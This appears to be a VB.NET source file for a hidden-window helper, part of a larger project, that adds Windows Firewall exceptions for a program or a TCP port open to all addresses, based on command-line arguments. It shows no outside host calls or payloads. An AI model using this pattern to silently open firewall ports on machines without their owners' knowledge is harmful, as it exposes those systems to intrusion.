Imports NetFwTypeLib
Public Class Main

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        StartUp.Init()
        ReadParameters(Command())
    End Sub

    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                Dim args() As String = parameter.Split(" ")

                If args(0).ToLower Like "*/basic*" Then
                    AddBasicException(args(1), args(2), Boolean.Parse(args(3)))
                ElseIf args(0).ToLower Like "*/simple*" Then
                    AddSimpleException(args(1), args(2), Boolean.Parse(args(3)))
                End If
            End If
            End
        Catch ex As Exception
            BoroHearSendContent(AddToLog("ReadParameters@Main", "Error: " & ex.Message, True))
            End
        End Try
    End Sub

    Sub AddBasicException(ByVal ruleName As String, ByVal procPath As String, ByVal Active As Boolean)
        Try
            Dim appType As Type = Type.GetTypeFromProgID("HnetCfg.FwAuthorizedApplication")
            Dim app As INetFwAuthorizedApplication
            app = DirectCast(Activator.CreateInstance(appType), INetFwAuthorizedApplication)

            app.Name = ruleName
            app.ProcessImageFileName = procPath
            app.Scope = NetFwTypeLib.NET_FW_SCOPE_.NET_FW_SCOPE_ALL
            app.Enabled = Active

            Dim fwMgrType As Type = Type.GetTypeFromProgID("HnetCfg.FwMgr")
            Dim fwMgr As INetFwMgr
            fwMgr = DirectCast(Activator.CreateInstance(fwMgrType), INetFwMgr)

            Dim apps As INetFwAuthorizedApplications
            apps = fwMgr.LocalPolicy.CurrentProfile.AuthorizedApplications
            apps.Add(app)
            BoroHearSendContent("Basic exception created!")
        Catch ex As Exception
            BoroHearSendContent(AddToLog("AddBasicException@Main", "Error: " & ex.Message, True))
        End Try
    End Sub
    Sub AddSimpleException(ByVal ruleName As String, ByVal portPort As Integer, ByVal Active As Boolean)
        Try
            Dim icfMgr As INetFwMgr
            Dim TicfMgr As Type = Type.GetTypeFromProgID("HNetCfg.FwMgr")
            icfMgr = DirectCast(Activator.CreateInstance(TicfMgr), INetFwMgr)

            Dim profile As INetFwProfile
            Dim portClass As INetFwOpenPort
            Dim TportClass As Type = Type.GetTypeFromProgID("HNetCfg.FWOpenPort")
            portClass = DirectCast(Activator.CreateInstance(TportClass), INetFwOpenPort)

            profile = icfMgr.LocalPolicy.CurrentProfile

            portClass.Name = ruleName
            portClass.Port = portPort
            portClass.Scope = NetFwTypeLib.NET_FW_SCOPE_.NET_FW_SCOPE_ALL
            portClass.Protocol = NetFwTypeLib.NET_FW_IP_PROTOCOL_.NET_FW_IP_PROTOCOL_TCP
            portClass.Enabled = Active

            profile.GloballyOpenPorts.Add(portClass)
            BoroHearSendContent("Simple exception created!")
        Catch ex As Exception
            BoroHearSendContent(AddToLog("AddSimpleException@Main", "Error: " & ex.Message, True))
        End Try
    End Sub
End Class